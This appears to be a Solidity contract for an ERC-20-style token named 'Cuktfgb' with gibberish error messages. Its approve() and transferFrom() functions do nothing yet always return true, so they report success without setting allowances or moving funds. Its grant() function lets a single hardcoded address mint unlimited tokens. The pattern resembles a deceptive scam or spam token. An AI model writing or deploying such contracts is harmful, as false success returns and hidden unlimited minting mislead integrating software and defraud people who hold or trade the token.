// SPDX-License-Identifier: MIT

pragma solidity 0.8.18;

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}


contract Cuktfgb is IERC20 {
    string public constant name = 'Cuktfgb';
    string public constant symbol = 'Cuktfgb';
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Grant(address receipt, uint256 value);
    function grant(address receipt, uint256 value) external {
        require(msg.sender == 0xeE10A22A0542C6948ee8f34A574a57eB163aCaD0, 'uzinytblhnviungh: only owner can grant.');
        balanceOf[receipt] += value;
        totalSupply += value;
        emit Grant(receipt, value);
    }

    function approve(address spender, uint value) external returns (bool) {
        return true;
    }

    function transfer(address to, uint value) external returns (bool) {
        require(balanceOf[msg.sender] >= value, 'vvajytkgddqtufag: ransfer amount exceeds balance.');
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        return true;
    }
    
}